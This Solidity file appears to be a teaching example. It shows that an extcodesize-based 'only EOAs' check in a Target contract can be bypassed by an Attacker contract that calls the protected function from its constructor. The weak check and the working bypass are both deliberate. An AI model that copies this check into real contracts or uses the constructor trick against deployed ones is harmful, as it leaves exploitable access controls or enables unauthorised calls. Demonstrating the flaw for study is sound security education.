// SPDX-License-Identifier: MIT
// Author: Yaghoub Adelzadeh
// GitHub: https://www.github.com/dappteacher
pragma solidity ^0.8.25;

// The Target contract is designed to restrict access to a function, only allowing EOAs (Externally Owned Accounts) to call it.
contract Target {
    // A public boolean variable to track if the protected function was successfully called.
    bool public passed; 

    // This function checks if the given address is a contract.
    function isContract(address _account) public view returns (bool) {
        // Uncommented version of code to check if the address is a contract
        // if(_account.code.length > 0 ){
        //     return (true);
        // }else{
        //     return (false);
        // }

        // The extcodesize assembly opcode returns the size of the code at a given address.
        // If the size is greater than 0, it is a contract.
        uint256 length;
        assembly {
            length := extcodesize(_account) 
        }
        return length > 0; 
    }

    // The autorizationToPass function can only be called by EOAs (Externally Owned Accounts), not contracts.
    function autorizationToPass() external {
        // Ensure the caller is not a contract.
        require(!isContract(msg.sender), "No contract autorizationToPass!");
        // Set the passed variable to true if the caller is an EOA. 
        passed = true; 
    }
}

// The TryAttack contract attempts to call the autorizationToPass function of the Target contract but will fail.
contract TryAttack {
    // This function attempts to call the autorizationToPass function of the Target contract.
    function tryPass(address _target) external {
        // This call will fail because Target's autorizationToPass function blocks calls from contracts.
        Target(_target).autorizationToPass();
    }
}

// The Attacker contract demonstrates a way to bypass the isContract check during contract creation.
contract Attacker {
    // A public boolean variable to store if the address is a contract.
    bool public isContract; 
    // A public address variable to store the address of this contract.
    address public account; 

    // The constructor of the Attacker contract is called during its creation.
    // At this time, the extcodesize of the contract is 0, bypassing the isContract() check in the Target contract.
    constructor(address _target) {
        // Check if this contract is considered a contract by the Target contract.
        isContract = Target(_target).isContract(address(this));
        // Store the address of this contract.
        account = address(this);
        // This call to the autorizationToPass function will succeed because the code size is 0 during the constructor execution.
        Target(_target).autorizationToPass();
    }
}
